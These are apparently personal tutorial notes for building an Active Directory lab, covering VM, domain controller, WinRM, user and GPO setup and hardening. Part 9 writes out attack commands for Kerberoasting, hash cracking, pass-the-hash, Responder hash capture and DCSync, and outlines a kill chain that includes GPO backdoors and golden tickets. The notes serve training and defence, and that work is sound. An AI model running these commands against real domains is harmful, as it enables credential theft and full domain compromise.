# Active Directory Building notes

### **Part 1: Introduction to Active Directory & Lab Setup Overview**

---

## 🧠 What is Active Directory?

**Active Directory (AD)** is a centralized directory service developed by Microsoft. It’s designed to manage users, computers, and other resources in a networked environment. AD enables administrators to organize, control, and enforce security policies across the IT infrastructure.

### 🔒 Core Functions of AD:

- **Authentication:** Verifies identity of users/devices (e.g., username/password login).
- **Authorization:** Determines what resources a user or system can access.
- **Directory Services:** Stores information about users, computers, printers, groups, and policies.
- **Policy Management:** Apply and enforce security and configuration policies via Group Policy Objects (GPOs).
- **Replication:** Syncs changes across Domain Controllers (DCs) to maintain consistent directory data.

### 🧱 Components of Active Directory:

| Component | Description |
| --- | --- |
| **Domain** | A security boundary for a group of users/computers under common policies. |
| **OU (Org Unit)** | Logical containers for organizing domain resources hierarchically. |
| **Forest** | The highest level — collection of one or more domains that share trust. |
| **Tree** | A hierarchical arrangement of domains in a forest. |
| **Domain Controller** | Server that stores AD database and handles authentication/authorization. |
| **Global Catalog** | Provides universal object search across forests. |
| **FSMO Roles** | Special roles (e.g., PDC Emulator, Schema Master) distributed among DCs. |

---

## 🎯 Objective of This Lab

We’re building a **fully functional Active Directory lab** using virtualization on a local machine. The goal is to:

- Simulate a small enterprise environment
- Practice domain setups, domain joins, GPOs, remoting, and red teaming
- Understand Windows Server internals
- Prepare for certifications (e.g., SC-300, Pentest+, OSCP)

---

## 🛠️ Required Tools

| Tool | Purpose |
| --- | --- |
| **VMware Workstation 17 Player** | Virtualization platform |
| **Windows Server 2016 ISO** | Domain Controller OS |
| **Windows 10 Enterprise ISO** | Client OS for user machines |
| **Kali Linux ISO** | Attacker machine |

### 📦 Additional Software (Optional but Recommended)

- Remote Server Admin Tools (RSAT)
- Sysinternals Suite
- Wireshark for packet sniffing
- Windows Admin Center
- Active Directory Explorer (from Sysinternals)

---

## 🖥️ System Requirements (Host Machine)

| Resource | Minimum | Recommended |
| --- | --- | --- |
| **RAM** | 8 GB | 16 GB |
| **CPU** | Dual-core | Quad-core |
| **Disk** | 60 GB | 100+ GB SSD |
| **OS** | Windows 10+ or Linux with VMware support |  |

---

## 📋 Virtual Machines to Create

| VM Name | OS Version | Role | IP (Static Recommended) |
| --- | --- | --- | --- |
| **DC1** | Windows Server 2016 | Domain Controller | 192.168.142.155 |
| **WS01** | Windows 10 Enterprise | User Machine 1 | 192.168.142.144 |
| **WS02** | Windows 10 Enterprise | User Machine 2 | 192.168.142.145 (optional) |
| **KALI01** | Kali Linux | Attacker Machine | DHCP / static |

Each VM should have 2 GB RAM, 1 vCPU minimum (adjust based on your system's resources).

---

## 🔧 VM Configuration Checklist (All VMs)

| Setting | Value |
| --- | --- |
| **Network Adapter** | NAT |
| **Remove Floppy** | Yes |
| **Enable Virtualization** | BIOS should support VT-x or AMD-V |
| **ISO Selection** | Use correct ISO image during VM creation |
| **Disk Size** | 40 GB min for Windows; 20 GB for Kali |
| **Snapshots** | Take one after OS installation |

---

### **Part 2: Installing & Preparing the Domain Controller (DC1)**

---

## 🛠️ Windows Server 2016 — Installation (VM: `DC1`)

### ✅ Step-by-Step Installation in VMware Workstation

1. **Create a New Virtual Machine**
    - Open VMware Workstation > `Create a New Virtual Machine`
    - Select **“Typical”** installation
    - Use ISO image for Windows Server 2016
2. **Configure Virtual Machine**
    - **Name:** `DC1`
    - **Location:** Choose desired folder
    - **Disk Size:** 40 GB (Split into multiple files if using HDD)
3. **Hardware Customization**
    - **Memory:** 2048 MB (or 4096 MB if possible)
    - **Processors:** 1 (2 cores preferred)
    - **Network Adapter:** NAT (used for internet & internal communication)
    - **Remove:** Floppy Drive
    - **Ensure:** Virtualization is enabled in host BIOS (VT-x / AMD-V)
4. **Begin Installation**
    - Boot from ISO > Press any key to start
    - Choose:
        - **Language:** English (US)
        - **Time Format:** English (India)
        - **Keyboard:** US
    - Click `Install Now`
5. **Select Windows Version**
    - Choose: **Windows Server 2016 Standard (Desktop Experience)**
        
        *(The one with GUI for easier management)*
        
6. **Accept License Terms**
    - Click `Next`
7. **Installation Type**
    - Choose: `Custom: Install Windows only (advanced)`
8. **Select Disk**
    - Unallocated Space > `Next`
9. **Installation Begins**
    - Wait for installation to complete
    - Reboot automatically

---

## ⚙️ Initial Configuration (Post-Install)

### 🧾 Set Administrator Password

- Choose a **strong password** when prompted
    
    > Use: Admin@123 (for lab only; not production secure)
    > 

### 🔐 Login to the system

- Press `Ctrl+Alt+Insert` in VMware to open login screen
- Enter Administrator password

---

## 🔄 Change Computer Name

### Rename the default hostname to `DC1`

1. Press `Win + X` → Open **System**
2. Click `Rename this PC` → Set name to `DC1`
3. Reboot after renaming

Alternatively, in PowerShell:

```powershell
Rename-Computer -NewName "DC1" -Force -Restart

```

---

## 🌐 Assign a Static IP to DC1

### ❗ Why Static IP is Required?

- DHCP lease can change, breaking domain clients & DNS
- A fixed IP ensures domain consistency

### Steps to Set Static IP:

1. Right-click `Network icon` > Open **Network & Sharing Center**
2. Click `Change adapter settings`
3. Right-click `Ethernet` > Properties
4. Select `Internet Protocol Version 4 (TCP/IPv4)` > Properties
5. Set the following:

```
IP Address:       192.168.142.155
Subnet Mask:      255.255.255.0
Default Gateway:  192.168.142.2
Preferred DNS:    127.0.0.1
Alternate DNS:    (leave blank)

```

> Note: We use loopback (127.0.0.1) because the DNS server will run on this very machine after AD is installed.
> 

---

## 📆 Set Time Zone

1. Open Date & Time settings
2. Disable “Set time automatically”
3. Select your correct **time zone** (e.g., `(UTC+05:30) Chennai, Kolkata, Mumbai, New Delhi`)
4. Sync with internet time (optional, but helps with Kerberos)

---

## 🔁 Windows Updates (Optional for Now)

- Run this later to avoid unnecessary delays
- You can take a **snapshot now** to save clean state

---

## 📸 Take VMware Snapshot

- Go to VM menu > `Snapshot` > `Take Snapshot`
- Name it: `Post-Install Clean`

---

## 🔓 Enable Remote Desktop (Optional)

If planning to RDP into DC1:

1. Right-click `This PC` > `Properties` > `Remote Settings`
2. Enable `Allow remote connections to this computer`
3. Firewall will auto-adjust

---

## ✅ DC1 — Checklist

| Task | Status |
| --- | --- |
| OS Installed | ✅ |
| Hostname Changed | ✅ |
| Static IP Configured | ✅ |
| Time Zone Set | ✅ |
| Remote Desktop Enabled (opt.) | ✅ |
| Snapshot Taken | ✅ |

---

### **Part 3: PowerShell Remoting Setup via WinRM (Windows Remote Management)**

*— preparing DC1 for remote administrative control*

---

## 🧠 Why PowerShell Remoting?

PowerShell remoting is crucial in Active Directory environments for automating administrative tasks, managing remote machines, and performing security testing. It uses the **WSMan** protocol (Windows Remote Management, based on HTTP/HTTPS) to allow remote shell access and command execution.

---

## 🛠️ Step-by-Step: Enabling PowerShell Remoting on DC1

### ✅ Step 1: Enable PowerShell Remoting

Open PowerShell as Administrator:

```powershell
Enable-PSRemoting -Force

```

**What this does:**

- Starts the WinRM service
- Sets it to start automatically
- Adds a firewall exception for port 5985 (HTTP)
- Creates a default listener bound to all IPs

💡 If you're using Windows Server Core (no GUI), just type `powershell` and run the command above.

---

### 🔍 Step 2: Verify WinRM Configuration

Run:

```powershell
winrm quickconfig

```

Expected output:

- WinRM is already set up to receive requests.
- WinRM is already set up for remote management.

If prompted to allow changes, type `Y` and hit Enter.

---

### 🧰 Step 3: Manually Start/Check WinRM Service

Sometimes, the service may not run properly by default. To ensure it's active:

```powershell
Start-Service WinRM
Get-Service WinRM

```

Expected status: `Running`

---

## 🌐 WSMan Configuration Paths

WSMan settings are accessed like a filesystem in PowerShell:

```powershell
ls WSMan:\localhost\

```

Expected structure:

- Client
- Service
- Shell
- Listener
- Plugin
- ClientCertificate

### Dive deeper into `Client` settings:

```powershell
ls WSMan:\localhost\Client\

```

You’ll see:

- `TrustedHosts`
- `AllowUnencrypted`
- `Auth`
- `NetworkDelayms`
- `DefaultPorts`

---

## 🔐 TrustedHosts — Key for Workgroup or Lab Environments

In non-domain or lab environments, Kerberos can’t authenticate remote machines by default. That’s where **TrustedHosts** comes in.

### 🧪 Step 4: Set Trusted Hosts on DC1

You need to **whitelist the IPs** of remote machines you’ll be connecting to.

```powershell
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "192.168.142.144"

```

> ⚠️ If you're planning to manage multiple machines, you can do:
> 

```powershell
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "192.168.142.*"

```

### 🔎 To Check Current Value:

```powershell
Get-Item WSMan:\localhost\Client\TrustedHosts

```

If empty, no remoting to untrusted systems is allowed.

---

## ⚠️ Common Mistakes to Avoid

| Mistake | Fix/Explanation |
| --- | --- |
| Misspelling `Client` path | Use tab completion or double-check spelling |
| Forgetting to run as admin | Always launch PowerShell as Administrator |
| DNS mismatch | Use IP address if hostnames aren’t resolving |
| Blocked by firewall | Ensure WinRM port (5985) is open |

---

## 🧪 Quick Test: Open a Remote Session (Preview)

From DC1, try remoting into WS01 (which will be fully configured later):

```powershell
New-PSSession -ComputerName 192.168.142.144 -Credential (Get-Credential)

```

If successful, you’ll see:

- Session created with `Id`, `State = Opened`

Then enter it:

```powershell
Enter-PSSession 1

```

Now the prompt should change to:

```
[192.168.142.144]: PS C:\Users\...

```

Congrats — you're inside a remote shell.

---

## 🧠 Recap

| Action | Command Summary |
| --- | --- |
| Enable remoting | `Enable-PSRemoting -Force` |
| Start WinRM service | `Start-Service WinRM` |
| View trusted hosts | `Get-Item WSMan:\\localhost\\Client\\TrustedHosts` |
| Set trusted hosts | `Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value "192.168.142.144"` |
| Explore WSMan settings | `ls WSMan:\\localhost\\` |
| Start remote session | `New-PSSession -ComputerName IP -Credential (Get-Credential)` |
| Enter remote session | `Enter-PSSession ID` |

---

### **Part 4: Installing & Configuring Active Directory Domain Services (AD DS)**

*— promoting DC1 to a full Domain Controller and creating your first forest*

---

## 🧠 What is AD DS?

**Active Directory Domain Services (AD DS)** is the core role of Active Directory. It provides the directory database that stores objects like users, computers, and groups, and manages authentication, authorization, and policy enforcement.

Once installed, the server becomes a **Domain Controller** (DC), the heart of the domain infrastructure.

---

## 📦 Step-by-Step: Install the AD DS Role on DC1

### ✅ Step 1: Launch PowerShell

> Even if you're in GUI mode, always use PowerShell to stay scriptable and repeatable.
> 

```powershell
PowerShell

```

---

### 🔍 Step 2: View Available Features

To list all installable roles/features:

```powershell
Get-WindowsFeature

```

To filter for AD-specific features:

```powershell
Get-WindowsFeature | Where-Object {$_.Name -like "*AD*"}

```

---

### 🛠 Step 3: Install AD DS Role + Tools

```powershell
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools

```

This installs:

- Core AD DS role
- Remote Server Administration Tools (RSAT)
- PowerShell modules
- GUI-based MMC consoles (if GUI version)

---

## 🌳 Step 4: Promote the Server to Domain Controller

Now that the AD DS role is installed, promote DC1 to create a **new forest and domain**.

### ✅ Import the Deployment Module

```powershell
Import-Module ADDSDeployment

```

---

### 🏗 Install the Forest

Use this command to begin domain creation:

```powershell
Install-ADDSForest

```

You will be prompted to enter:

| Prompt | Your Input |
| --- | --- |
| Root domain name | `activedirectory.local` |
| NetBIOS domain name | `ACTIVEDIRECTORY` (auto) |
| Safe mode administrator password | Set something strong (e.g., `Safe@123`) |

> Safe Mode password is required for Directory Services Restore Mode (DSRM) — critical for disaster recovery.
> 

---

### ⚠️ Auto Reboot

Once the domain setup completes:

- The system will **auto-reboot**
- It will return as **a fully configured Domain Controller**

---

## ✅ After Reboot: Initial Validation

### Log In

Use your domain admin account:

```
Username: activedirectory\Administrator
Password: [your AD admin password]

```

You are now logging into the domain — not just the local machine.

---

### Verify Domain Configuration

Launch PowerShell and check:

```powershell
Get-ADDomain
Get-ADForest

```

You should see:

- Domain name: `activedirectory.local`
- Forest root: `activedirectory.local`
- Functional levels: Windows Server 2016 or compatible

---

## 📡 Verify DNS Role (Important)

Active Directory **depends heavily on DNS** for everything — authentication, locating domain controllers, etc.

To check if DNS is properly installed:

```powershell
Get-WindowsFeature DNS*

```

> If not installed, do:
> 

```powershell
Install-WindowsFeature DNS -IncludeManagementTools

```

### 🧪 Test DNS Configuration

Run:

```powershell
nslookup
> set type=all
> _ldap._tcp.dc._msdcs.activedirectory.local

```

You should get a response from your DC's IP (e.g., `192.168.142.155`).

---

## 🧰 Optional: GUI Tools for AD Management

If you're using GUI version of Server:

- Open **Server Manager**
- Go to **Tools** menu
- Access:
    - Active Directory Users and Computers
    - DNS Manager
    - Group Policy Management

---

## 🧠 Summary

| Step | Description | Status |
| --- | --- | --- |
| AD DS Role Installed | ✅ |  |
| Forest Created (`activedirectory.local`) | ✅ |  |
| DC1 Promoted to Domain Controller | ✅ |  |
| DNS Installed/Verified | ✅ |  |
| Admin can log in as domain user (`activedirectory\\Administrator`) | ✅ |  |
| Server auto-rebooted post-promotion | ✅ |  |

---

### **Part 5: Join Client Machine (WS01) to the Active Directory Domain**

*— prepping a Windows 10/11 machine (WS01) to become a domain member of `activedirectory.local`*

---

## 🧠 Why Join to Domain?

Joining a machine to the domain:

- Enables **centralized identity/auth management**
- Enforces **Group Policies (GPOs)**
- Allows **SSO (Single Sign-On)** for domain services
- Lets administrators control systems from DC1

---

## 🛠️ Step-by-Step: Static IP & DNS for WS01

### ✅ Step 1: Set Static IP

**Why?** DHCP can change IPs; domain networking needs consistency.

Open PowerShell (Admin) on WS01:

```powershell
New-NetIPAddress -InterfaceAlias "Ethernet0" -IPAddress 192.168.142.144 -PrefixLength 24 -DefaultGateway 192.168.142.2

```

Replace `Ethernet0` if your interface is named differently (use `Get-NetAdapter` to check).

---

### 🧠 Step 2: Set Preferred DNS to DC1

Set the DNS server IP to point to the Domain Controller (DC1):

```powershell
Set-DnsClientServerAddress -InterfaceAlias "Ethernet0" -ServerAddresses 192.168.142.155

```

Check if DNS is set correctly:

```powershell
Get-DnsClientServerAddress

```

---

## 🧪 Step 3: Check DNS Resolution

Confirm you can resolve the domain:

```powershell
nslookup activedirectory.local

```

If you get a reply from DC1's IP, you're good.

If not, DNS is broken — check firewall rules or repeat DNS setup.

---

## 🌐 Step 4: Join WS01 to the Domain

### Option A — Using GUI

1. Open **System Properties** (`sysdm.cpl`)
2. Click **"Change settings"** under "Computer Name"
3. Click **"Change..."**
4. Select **Domain**, enter:
    
    ```
    activedirectory.local
    
    ```
    
5. When prompted, use:
    - Username: `Administrator`
    - Password: your AD admin pass (e.g., `Safe@123`)
6. Reboot when prompted

---

### Option B — Using PowerShell (Cleaner)

```powershell
Add-Computer -DomainName activedirectory.local -Credential activedirectory\Administrator -Restart

```

This command:

- Initiates the join
- Prompts for password
- Reboots the system automatically

> ⚠️ If it fails, verify:
> 
> - DNS resolution works
> - Time sync is valid (domain requires accurate time)

---

## 🔐 Post-Join Validation

### After Reboot, Log in with Domain Account:

Use the format:

```
activedirectory\Administrator

```

> 🔑 You’re now authenticated via the Domain Controller — not the local SAM.
> 

---

### Verify Domain Join Status

Run:

```powershell
systeminfo | findstr /i "Domain"

```

Expected output:

```
Domain: activedirectory.local

```

Also:

```powershell
whoami

```

Should return:

```
activedirectory\administrator

```

---

## 🧠 Recap

| Task | Command/Tool Used | Expected Result |
| --- | --- | --- |
| Set static IP | `New-NetIPAddress` | IP = 192.168.142.144 |
| Set DNS to point to DC1 | `Set-DnsClientServerAddress` | DNS = 192.168.142.155 |
| Confirm DNS resolution | `nslookup activedirectory.local` | Response from DC1 |
| Join domain | GUI or `Add-Computer` | Success + Reboot |
| Log in with domain credentials | `activedirectory\Administrator` | Access granted |
| Check domain join status | `systeminfo`, `whoami` | Domain listed |

---

### **Part 6: Creating & Managing AD Users, Groups, and Organizational Units (OUs)**

*— your first dive into Active Directory object management*

---

## 🧠 Why Structure Matters

A domain with 10 users? You can wing it.

A domain with 10,000? You *need structure*.

This is where **OUs**, **users**, and **groups** come into play.

---

## 🔹 Step 1: Create Organizational Units (OUs)

**What are OUs?**

Think of them as logical folders inside Active Directory to organize users, computers, and groups.

### 📁 Example Structure:

```
activedirectory.local
├── GU-Users
│   ├── Admins
│   └── Interns
├── GU-Computers
└── GU-Groups

```

### ✅ PowerShell: Create OUs

```powershell
New-ADOrganizationalUnit -Name "GU-Users" -Path "DC=activedirectory,DC=local"
New-ADOrganizationalUnit -Name "Admins" -Path "OU=GU-Users,DC=activedirectory,DC=local"
New-ADOrganizationalUnit -Name "Interns" -Path "OU=GU-Users,DC=activedirectory,DC=local"
New-ADOrganizationalUnit -Name "GU-Computers" -Path "DC=activedirectory,DC=local"
New-ADOrganizationalUnit -Name "GU-Groups" -Path "DC=activedirectory,DC=local"

```

---

## 👤 Step 2: Create Domain Users

### Example Users:

- `admin.jasstej`
- `intern.vikram`

### ✅ PowerShell: Create Users

```powershell
New-ADUser -Name "Jasstej Singh" -GivenName "Jasstej" -Surname "Singh" -SamAccountName "admin.jasstej" `
-UserPrincipalName "admin.jasstej@activedirectory.local" -AccountPassword (ConvertTo-SecureString "Test@123" -AsPlainText -Force) `
-Path "OU=Admins,OU=GU-Users,DC=activedirectory,DC=local" -Enabled $true

New-ADUser -Name "Vikram Rana" -GivenName "Vikram" -Surname "Rana" -SamAccountName "intern.vikram" `
-UserPrincipalName "intern.vikram@activedirectory.local" -AccountPassword (ConvertTo-SecureString "Test@123" -AsPlainText -Force) `
-Path "OU=Interns,OU=GU-Users,DC=activedirectory,DC=local" -Enabled $true

```

> 🔐 Force users to change passwords at first logon:
> 

```powershell
Set-ADUser -Identity admin.jasstej -ChangePasswordAtLogon $true

```

---

## 👥 Step 3: Create Security Groups

Groups let you manage **permissions** and **access policies** at scale.

### ✅ Example: Create Admins Group

```powershell
New-ADGroup -Name "Domain Admins (Custom)" -SamAccountName "gu.admins" `
-GroupCategory Security -GroupScope Global -Path "OU=GU-Groups,DC=activedirectory,DC=local"

```

### Add users to group:

```powershell
Add-ADGroupMember -Identity "gu.admins" -Members admin.jasstej

```

You can verify group membership using:

```powershell
Get-ADGroupMember -Identity "gu.admins"

```

---

## 💡 Best Practices So Far

| Task | Best Practice Tip |
| --- | --- |
| OU Design | Reflect business units or roles |
| Password Policy | Complex + rotated often |
| Naming Convention | `admin.firstname`, `intern.firstname` (consistency) |
| Privileged Group Handling | Keep separate groups for admins, devs, interns, etc. |
| Principle of Least Priv. | Don't make users domain admins unless absolutely needed |

---

## 🔎 Validate

### Check OU structure:

```powershell
Get-ADOrganizationalUnit -Filter *

```

### List users in a specific OU:

```powershell
Get-ADUser -SearchBase "OU=Admins,OU=GU-Users,DC=activedirectory,DC=local" -Filter *

```

### List all groups:

```powershell
Get-ADGroup -Filter *

```

---

## 🧠 Summary

| Object Type | Name(s) | Status |
| --- | --- | --- |
| OU | GU-Users, Admins, Interns | ✅ |
| User | admin.jasstej, intern.vikram | ✅ |
| Group | gu.admins | ✅ |
| Membership | admin.jasstej → gu.admins | ✅ |

---

### **Part 7: Group Policy Objects (GPOs) – Configuration & Enforcement**

*— bend the domain to your will using Group Policy*

---

## 🧠 Why Use GPOs?

Group Policy Objects are the **backbone of centralized control** in Active Directory.

With GPOs, you can:

- Enforce password policies
- Restrict USBs and software installs
- Push desktop wallpaper, lockout timeouts, disable CMD, etc.
- Harden clients across your entire domain
- Define user rights, privileges, and more — without touching every PC

---

## 🔧 Step 1: Launch Group Policy Management Console

**From DC1:**

```bash
gpmc.msc

```

Alternatively:

Start Menu → Administrative Tools → **Group Policy Management**

---

## 📂 Step 2: GPO Structure in a Domain

```
activedirectory.local
├── Group Policy Objects
│   ├── Default Domain Policy
│   └── Default Domain Controllers Policy
└── Linked OUs
    ├── GU-Users
    ├── GU-Computers
    └── Custom GPOs (linked here)

```

> 🎯 Don't edit default policies directly.
> 
> 
> Always create new GPOs unless absolutely necessary.
> 

---

## 🛠️ Step 3: Create a New GPO

### Example: Disable USB Access GPO

1. Right-click **Group Policy Objects** → **New**
2. Name: `Disable USB Devices`
3. Right-click the new GPO → **Edit**

**Navigate to:**

```
Computer Configuration → Administrative Templates → System → Removable Storage Access

```

Enable the following:

- All Removable Storage classes: **Deny all access**

💾 Close the editor.

---

## 🔗 Step 4: Link GPO to an OU

Right-click the target OU (e.g., `GU-Computers`) → **Link an existing GPO** → Select `Disable USB Devices`

---

## ✅ Step 5: Force GPO Update on Client (WS01)

Log into WS01 (domain-joined), run:

```powershell
gpupdate /force

```

To verify policy status:

```powershell
gpresult /r

```

Check if `Disable USB Devices` is listed under **Applied Group Policy Objects**.

---

## 🔒 Step 6: Password Policy GPO (via Default Domain Policy)

This one's acceptable to set in **Default Domain Policy**, since password rules are domain-wide.

**Path:**

```
Computer Configuration → Policies → Windows Settings → Security Settings → Account Policies → Password Policy

```

Recommended values:

- Min Length: **12 characters**
- Enforce complexity: **Enabled**
- Max password age: **30 days**
- Lockout threshold: **5 attempts**

---

## 🧠 Pro Tips

| Goal | GPO Setting Location |
| --- | --- |
| Set custom wallpaper | User Config → Admin Templates → Desktop → Desktop → Desktop Wallpaper |
| Disable CMD or Regedit | User Config → System → Prevent access to command prompt |
| Block Task Manager | User Config → Ctrl+Alt+Del Options → Remove Task Manager |
| Auto-lock after inactivity | User Config → Windows Settings → Security → Interactive logon |
| Disable USB ports | Computer Config → Removable Storage Access |
| Deploy scripts | Computer/User Config → Windows Settings → Scripts (Startup/Logon) |

---

## 🧪 Testing and Validation

### View all GPOs:

```powershell
Get-GPO -All

```

### Check GPO linked to an OU:

```powershell
Get-GPInheritance -Target "OU=GU-Computers,DC=activedirectory,DC=local"

```

### View detailed settings in a GPO:

```powershell
Get-GPOReport -Name "Disable USB Devices" -ReportType Html -Path "C:\usb_policy.html"

```

---

## 📌 Summary Table

| GPO Name | Linked To | Key Settings |
| --- | --- | --- |
| Disable USB Devices | GU-Computers | Deny removable storage |
| Default Domain Policy | Root Domain | Password length, complexity, lockout |

---

### **Part 8: Active Directory Hardening & Security Controls**

*— if it ain’t hardened, it’s already breached*

---

## 🧠 Why Harden AD?

Because default Active Directory is like a castle with no drawbridge.

Attackers don't need zero-days — they exploit lazy config, over-permissioned accounts, and blind spots.

Let’s fix that.

---

## 🔒 1. Audit Policy Configuration (Log What Matters)

Logs are gold… but only if you're logging the right stuff.

**Set this via GPO:**

```powershell
gpmc.msc
→ Computer Configuration
→ Windows Settings
→ Security Settings
→ Advanced Audit Policy Configuration

```

### 📋 Recommended Audit Categories:

| Category | Subcategory |
| --- | --- |
| **Logon/Logoff** | Logon, Logoff, Special Logon |
| **Account Logon** | Kerberos Auth, Credential Validation |
| **Account Management** | User/Group management |
| **DS Access** | Directory Service Access |
| **Privilege Use** | Sensitive privilege use |
| **Object Access** | File, Registry, etc. access logs |

> 🛠 To make logs readable:
> 

```powershell
auditpol /get /category:*

```

---

## 🛡️ 2. Disable Legacy/Unsecure Protocols

- **Disable SMBv1**

```powershell
Set-SmbServerConfiguration -EnableSMB1Protocol $false

```

- **Disable LM/NTLMv1** in GPO

```
Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options →
“Network security: LAN Manager authentication level” → Set to “Send NTLMv2 response only. Refuse LM & NTLM”

```

---

## 👥 3. Principle of Least Privilege (PoLP)

### 🔻 Delegated Admin ≠ Domain Admin

Create custom roles like:

- `Printer_Admins`
- `OU_Admins`
- `Helpdesk_Resets` — can reset passwords, not create users

Use **Delegation Wizard**:

- Right-click OU → Delegate Control
- Select users → Pick specific permissions like `Reset Passwords` or `Create/Delete Computer Objects`

---

## 🧪 4. Security Filtering (Restrict GPO Application)

By default, a GPO linked to an OU applies to **Authenticated Users**.

Instead:

- Create a **security group**, e.g. `USB_Block_Group`
- Add specific users/computers
- In GPMC:
    - Remove “Authenticated Users” from GPO’s Security Filtering
    - Add your group, and **Allow ‘Read’ + ‘Apply Group Policy’**

This makes the GPO apply **only to that group**, even if it’s linked at a high-level OU.

---

## 🧼 5. Clean Up Default Accounts

- Rename `Administrator` to something random (`Admin-JS2025`)
- Disable the `Guest` account
- Remove unused accounts weekly

```powershell
Rename-LocalUser -Name "Administrator" -NewName "Admin-JS2025"
Disable-LocalUser -Name "Guest"

```

---

## 🔍 6. Attack Surface Reduction (ASR)

Use GPO or Endpoint Security to block:

- Macro-based Office attacks
- PsExec/remote tool abuse
- Untrusted script execution

Configure via GPO:

```
Computer Config → Admin Templates → Windows Defender Antivirus → ASR Rules

```

Enable rules like:

- Block credential stealing from LSASS
- Block execution of obfuscated scripts
- Block untrusted Office macros

---

## 📜 7. Secure DNS Zones

- Ensure **secure dynamic updates only** are enabled:

```
DNS Manager → Right-click Zone → Properties → Dynamic Updates: Secure only

```

- Enable auditing:

```powershell
Auditpol /set /subcategory:"DNS Server Events" /success:enable /failure:enable

```

- Lock down zone transfers:

```
DNS Manager → Zone Transfer tab → Allow only to servers listed on Name Servers tab

```

---

## 🧠 Pro Defense Tactics

| Action | Benefit |
| --- | --- |
| Limit Domain Admins to 0 logons | Prevent golden ticket attacks |
| Use LAPS or gMSA for local creds | Avoid static local passwords |
| Enable time-based group membership | Just-In-Time privilege (JIT) |
| Monitor with WEF or SIEM | Central log visibility |
| Setup honeyuser accounts | Tripwire for AD privilege abuse |

---

## 🧪 Tools for AD Security Testing

| Tool | Purpose |
| --- | --- |
| BloodHound | Graph AD relationships, spot privilege abuse paths |
| PingCastle | AD security audit with scoring |
| SharpHound | Collect data for BloodHound |
| LAPS | Local Admin Password Solution |

---

## 🧱 Summary Table

| Security Control | Configured? | Method |
| --- | --- | --- |
| Audit Policy | ✅ | GPO → Advanced Audit Policy |
| Disable SMBv1 | ✅ | PowerShell |
| NTLMv1 Disabled | ✅ | GPO Security Options |
| Delegated Admins | ✅ | Delegation Wizard |
| GPO Security Filtering | ✅ | Security Groups + GPMC |
| DNS Lockdown | ✅ | DNS Manager |

---

### **Part 9: Realistic AD Attack Simulations & Red Team Scenarios**

*— Know thy enemy, sharpen thy defense*

---

## 🎭 Why Simulate Attacks?

Because theory doesn’t catch attackers.

You need to **see the cracks before someone crawls through**.

Red teaming an AD lab is the ultimate way to understand misconfigurations, privilege escalation, and domain dominance.

---

## ⚙️ 1. Lab Setup Recap

You should have:

- **DC1** – Domain Controller (Active Directory, DNS)
- **WS01** – Domain-joined Windows 10 client
- **Kali/Parrot VM** – External attacker box (on same NAT/Host-only network)
- Optional: **Server01** as domain member server

---

## 🛠️ 2. Tools You’ll Need

| Tool | Use Case |
| --- | --- |
| BloodHound | Mapping attack paths |
| Mimikatz | Dumping credentials |
| Rubeus | Kerberoasting & ticket operations |
| CrackMapExec | Lateral movement, pass-the-hash |
| Responder | NTLM relays via rogue services |
| PowerView | Recon, enumeration, privilege abuse |
| Impacket | TGS abuse, SMB relays, DCSync, etc. |

---

## 🎯 3. Attack Simulation: Kerberoasting

### 🧠 Objective:

Extract service tickets for SPNs and crack their hashes offline to get plaintext credentials.

---

### 📍 Step-by-Step (From Attacker Box / Domain-joined low-priv user):

**Step 1: Get SPNs of service accounts**

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName |
Select-Object Name, SamAccountName, ServicePrincipalName

```

**Step 2: Use Rubeus or Impacket to request tickets**

```powershell
Rubeus kerberoast

```

Or with Impacket:

```bash
GetUserSPNs.py -dc-ip 192.168.142.150 activedirectory.local/john:Password123

```

**Step 3: Crack the hashes offline**

```bash
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt

```

Boom. Plaintext service account password.

> 🛡️ Mitigation:
> 
> - Use complex, non-human service account passwords
> - Use gMSAs instead of static passwords
> - Monitor for unusual ticket requests

---

## 🐍 4. Pass-the-Hash (PtH) Attack

PtH abuses **NTLM hashes** to authenticate as another user without knowing the password.

**From attacker:**

```bash
crackmapexec smb 192.168.142.155 -u administrator -H <NTLM_HASH>

```

If successful, this logs in **as Administrator**.

> 🛡️ Mitigation:
> 
> - Enable Credential Guard
> - Disable NTLM auth where possible
> - Use LAPS for local admin creds

---

## 🧬 5. Lateral Movement via SMB/WinRM

**Using Evil-WinRM (Post hash/dump):**

```bash
evil-winrm -i 192.168.142.150 -u administrator -H <NTLM_HASH>

```

Once in, dump local creds, install persistence, escalate.

> 🧠 Real targets: File shares, user folders, startup scripts
> 

---

## 🎣 6. Responder Attack (Man-in-the-Middle)

Fake services to **trick a Windows client into leaking its hash**.

```bash
responder -I eth0

```

Then, trigger a client connection:

```bash
\\attacker_ip\share

```

Captured hashes can be cracked (NetNTLMv2).

> 🛡️ Mitigation:
> 
> - Disable LLMNR, NBT-NS
> - Use SMB signing
> - Don’t auto-connect to unknown shares

---

## 🧬 7. DCSync Attack (Full DC Compromise)

Once you get **Replicating Directory Changes All** rights, you can extract password hashes **of any domain user** — including krbtgt.

```bash
secretsdump.py -just-dc -k activedirectory.local/attacker@DC1

```

> 🛡️ Mitigation:
> 
> - Restrict DCSync rights
> - Regularly rotate krbtgt password
> - Alert on 4662 & 4670 event IDs

---

## 🔗 8. Bonus: Create a Red Team Kill Chain

1. **Initial Access** – Phish or gain creds of a low-priv user
2. **Enumeration** – PowerView to map users, GPOs, groups
3. **Kerberoasting** – Crack weak SPN passwords
4. **Privilege Escalation** – Find DA path via BloodHound
5. **Lateral Movement** – PtH, WinRM, scheduled tasks
6. **Domain Persistence** – Backdoor GPO, golden ticket
7. **Exfiltration** – Extract hashes, secrets, and logs

---

## 🧠 Practice this like muscle memory.

Run attacks. Break it.

Then ask yourself: *how do I detect and prevent this?*

---

### **Part 10: Detection & Monitoring in Active Directory**

*— “A watched domain never burns”*

---

## 🔍 Why Monitor?

Because attackers leave footprints.

Detection is how you **turn signal into defense**.

With proper visibility, you catch privilege abuse, lateral movement, ticket theft, and more — before it’s too late.

This section covers **native logging**, **Sysmon**, **Windows Event Forwarding (WEF)**, and **SIEM logic**.

---

## 🛠️ 1. Baseline Native Windows Logging

Each Windows system already logs *some* useful data. Focus on:

| Log Name | Use |
| --- | --- |
